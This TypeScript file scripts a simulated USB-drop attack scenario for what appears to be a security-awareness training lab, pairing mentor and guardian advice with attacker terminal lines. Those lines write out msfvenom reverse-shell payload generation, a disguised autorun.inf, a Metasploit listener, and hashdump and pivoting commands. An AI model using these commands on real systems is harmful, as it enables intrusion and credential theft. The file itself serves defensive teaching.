import { ScenarioScript } from '../lab-engine';

export const usbDropScript: ScenarioScript = {
    id: 'usb-01',

    victimScreens: [
        { id: 'office-floor',    type: 'desktop', url: 'CORP-PC01',   content: 'OFFICE_FLOOR' },
        { id: 'usb-inserted',    type: 'browser', url: 'CORP-PC01',   content: 'USB_INSERTED' },
        { id: 'autorun-trigger', type: 'desktop', url: 'CORP-PC01',   content: 'AUTORUN_TRIGGER' },
        { id: 'backdoor-open',   type: 'desktop', url: 'CORP-PC01',   content: 'BACKDOOR_OPEN' },
        { id: 'compromised',     type: 'result',  url: 'CORP-PC01',   content: 'COMPROMISED' },
    ],

    phases: [
        // ── PHASE 1 — PREPARE ─────────────────────────────────────────────
        {
            id: 'prepare',
            name: 'USB PAYLOAD PREPARED',
            autoPlay: true,
            progressPct: 15,
            victimScreen: 'office-floor',
            terminalLines: [
                { text: '══════════════════════════════════════',                        type: 'dim',     delay: 0 },
                { text: '  ATTACKER TERMINAL — USB Drop',                               type: 'dim',     delay: 100 },
                { text: '══════════════════════════════════════',                        type: 'dim',     delay: 200 },
                { text: '',                                                              type: 'dim',     delay: 300 },
                { text: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f exe -o update.exe', type: 'command', delay: 500 },
                { text: '[+] Payload created: update.exe',                              type: 'success', delay: 1600 },
                { text: '',                                                              type: 'dim',     delay: 2000 },
                { text: 'cat autorun.inf',                                              type: 'command', delay: 2300 },
                { text: '[AutoRun]',                                                     type: 'output',  delay: 3100 },
                { text: 'open=update.exe',                                              type: 'output',  delay: 3300 },
                { text: 'action=Install CorpBank Security Update',                      type: 'output',  delay: 3500 },
                { text: 'label=CorpBank IT Tools',                                      type: 'output',  delay: 3700 },
                { text: 'icon=corpbank.ico',                                            type: 'output',  delay: 3900 },
                { text: '',                                                              type: 'dim',     delay: 4200 },
                { text: 'cp autorun.inf /usb/ && cp update.exe /usb/ && cp corpbank.ico /usb/', type: 'command', delay: 4500 },
                { text: '[+] USB drive prepared',                                       type: 'success', delay: 5300 },
                { text: '[+] Appears as: CorpBank IT Tools',                           type: 'data',    delay: 5700 },
                { text: '',                                                              type: 'dim',     delay: 6100 },
                { text: '[*] Attacker drops USB in CorpBank car park',                 type: 'info',    delay: 6400 },
                { text: '[*] Label: "SALARY INFORMATION Q4 2024"',                     type: 'warning', delay: 6900 },
                { text: '[*] Waiting for curious employee...',                          type: 'dim',     delay: 7500 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker labelled the USB drive SALARY INFORMATION — the most clicked label in USB drop studies. They left it in the car park where employees would find it. autorun.inf executes automatically when the USB is inserted on older Windows or when AutoPlay is enabled.',
                },
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'Studies show 45 percent of people plug in USB drives they find in public places. When labelled with enticing content like salary data that number rises to 90 percent. Human curiosity is the vulnerability.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'Never plug in USB drives found in public places — car parks, corridors, cafes. Attackers deliberately leave them hoping someone will plug them in. Treat found USB drives like you would a found syringe.',
                },
            ],
        },

        // ── PHASE 2 — INSERTED ────────────────────────────────────────────
        {
            id: 'inserted',
            name: 'USB INSERTED',
            autoPlay: false,
            progressPct: 30,
            victimScreen: 'office-floor',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[*] USB inserted by victim...',                 type: 'info',    delay: 300 },
                { text: '[+] AutoPlay dialog triggered',                 type: 'warning', delay: 900, trigger: 'usb-inserted' },
                { text: '[*] Showing: Install CorpBank Security Update', type: 'info',    delay: 1500 },
                { text: '[*] Waiting for victim to click...',            type: 'dim',     delay: 2100 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The AutoPlay popup looks exactly like a legitimate CorpBank IT notification. The icon and label were customised to appear official. Most employees would click Install assuming IT sent them this USB.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'AutoPlay popup appeared after USB insertion. Never click Run or Install from AutoPlay on unknown USB drives. Your IT department should communicate all software installations through official channels — never via USB.',
                },
            ],
            decisionPoint: {
                id: 'usb-decision',
                question: 'You found a USB labelled SALARY INFORMATION in the office car park. You plugged it in and AutoPlay appeared. What do you do?',
                description: 'Full attack plays out so you see exactly how USB attacks work.',
                choices: [
                    { label: '🖱️ Click Install — looks like an IT update',   safe: false, consequence: 'The payload executes and gives attacker full system access' },
                    { label: '⏏️ Eject immediately and report to IT',          safe: true,  consequence: 'Correct — found USB drives should always go to IT for analysis' },
                ],
            },
            nextPhase: 'autorun',
        },

        // ── PHASE 3 — AUTORUN ─────────────────────────────────────────────
        {
            id: 'autorun',
            name: 'PAYLOAD EXECUTING',
            autoPlay: true,
            progressPct: 55,
            victimScreen: 'usb-inserted',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[+] Victim clicked Install!',                   type: 'warning', delay: 300 },
                { text: '[*] autorun.inf executing update.exe...',       type: 'info',    delay: 900, trigger: 'autorun-trigger' },
                { text: '[*] Fake installer showing progress bar...',    type: 'info',    delay: 1500 },
                { text: '[*] Payload executing in background...',       type: 'info',    delay: 2100 },
                { text: '[*] Establishing reverse shell...',            type: 'info',    delay: 2700 },
                { text: '',                                              type: 'dim',     delay: 3100 },
                { text: 'msfconsole',                                   type: 'command', delay: 3400 },
                { text: 'msf6 > use exploit/multi/handler',             type: 'output',  delay: 4200 },
                { text: 'msf6 > set LHOST 192.168.1.200',              type: 'output',  delay: 4500 },
                { text: 'msf6 > run',                                   type: 'output',  delay: 4800 },
                { text: '[*] Waiting for connection...',                 type: 'dim',     delay: 5600 },
                { text: '[+] Meterpreter session opened!',              type: 'success', delay: 6400, trigger: 'backdoor-open' },
                { text: '[+] Victim: CORP-PC01 (192.168.1.45)',         type: 'data',    delay: 6800 },
                { text: '[+] Inside corporate network!',                type: 'success', delay: 7200 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker is now inside your corporate network through a device you physically carried past every security measure — badge readers, CCTV, reception. The USB bypassed your firewall, email filters and network security completely.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'Malicious USB payload executed. Attacker is now inside your corporate network. Disconnect machine immediately. Report incident to IT security. Identify where the USB was found for physical investigation.',
                },
            ],
        },

        // ── PHASE 4 — BACKDOOR ────────────────────────────────────────────
        {
            id: 'backdoor',
            name: 'DOMAIN ESCALATION',
            autoPlay: true,
            progressPct: 80,
            victimScreen: 'backdoor-open',
            terminalLines: [
                { text: '',                                                       type: 'dim',     delay: 0 },
                { text: 'meterpreter > sysinfo',                                  type: 'command', delay: 300 },
                { text: '[+] Inside: CorpBank internal network',                  type: 'data',    delay: 1100 },
                { text: '[+] Domain: CORPBANK.LOCAL',                             type: 'data',    delay: 1400 },
                { text: '',                                                       type: 'dim',     delay: 1800 },
                { text: 'meterpreter > run post/multi/recon/local_exploit',      type: 'command', delay: 2100 },
                { text: '[+] Finding privilege escalation paths...',              type: 'info',    delay: 3000 },
                { text: '[+] Domain admin credentials in memory!',                type: 'success', delay: 3800 },
                { text: '',                                                       type: 'dim',     delay: 4200 },
                { text: 'meterpreter > hashdump',                                 type: 'command', delay: 4500 },
                { text: '[+] Administrator:500:hash:hash',                        type: 'data',    delay: 5300 },
                { text: '',                                                       type: 'dim',     delay: 5700 },
                { text: 'meterpreter > run post/windows/manage/migrate',          type: 'command', delay: 6000 },
                { text: '[+] Pivoting to domain controller...',                   type: 'info',    delay: 6900 },
                { text: '[+] DOMAIN ADMIN ACCESS ACHIEVED',                       type: 'success', delay: 7800 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'From one USB drive the attacker escalated to domain administrator — controlling every single computer in the organisation. This is called lateral movement and privilege escalation. One USB bypassed years of perimeter security investment.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'Domain administrator compromise detected. Entire organisation at risk. Invoke incident response plan immediately. Isolate affected segments. Reset all domain admin credentials. Contact cybersecurity incident response firm.',
                },
            ],
            nextPhase: 'compromised',
        },

        // ── PHASE 5 — COMPROMISED ─────────────────────────────────────────
        {
            id: 'compromised',
            name: 'ATTACK COMPLETE',
            autoPlay: true,
            progressPct: 100,
            victimScreen: 'compromised',
            terminalLines: [
                { text: '',                                              type: 'dim',     delay: 0 },
                { text: '[+] Attack result:',                           type: 'data',    delay: 300 },
                { text: '[+] Entry vector:       USB drop',             type: 'data',    delay: 700 },
                { text: '[+] Privilege level:    Domain Admin',         type: 'data',    delay: 1000 },
                { text: '[+] Machines accessible: ALL',                 type: 'data',    delay: 1300 },
                { text: '[+] Data accessible:    ALL',                  type: 'data',    delay: 1600 },
                { text: '[+] Time to domain admin: 4 minutes',         type: 'data',    delay: 1900 },
                { text: '[+] ENTIRE ORGANISATION COMPROMISED',          type: 'error',   delay: 2500 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The Stuxnet worm that sabotaged Iranian nuclear centrifuges was delivered via USB drives dropped near the facility. It destroyed 1000 centrifuges and set the nuclear program back years — all from one USB drive.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'Future prevention: disable AutoPlay on all machines, implement USB device control to block unknown drives, train staff never to plug in found USB drives, use endpoint detection tools, physically label approved IT USB drives with tamper evident seals.',
                },
            ],
        },
    ],
};
